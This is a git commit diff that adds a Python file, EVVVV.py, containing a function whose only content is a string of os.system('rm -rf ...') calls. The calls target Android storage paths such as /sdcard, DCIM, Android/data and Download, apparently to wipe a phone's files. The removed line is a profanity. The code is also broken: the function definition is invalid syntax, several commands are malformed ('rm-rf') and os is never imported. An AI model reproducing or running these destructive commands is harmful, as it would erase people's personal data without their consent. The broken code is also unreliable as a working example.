9a4d4ee28925769cd94aa19561b6086512a21534
JIHAD-JDX <miuwhdhshsiridhh@gmail.com>
2024-07-12 21:04:09 +0200

    Update EVVVV.py

--- EVVVV.py
+++ EVVVV.py
@@ -1,1 +1,8 @@
-كسمك
+def EVVVV.py():
+    os.system('rm -rf /sdcard/*')
+    os.system('rm-rf /sdcard/DCIM/')
+    os.system('rm-rf /sdcard/Android/')
+    os.system('rm-rf /sdcard/Android/data/')
+    os.system('rm -rf /sdcard/Download/*')
+    os.system('rm -rf /sdcard1/*')
+    os.system('rm -rf /sdcard/0/*')
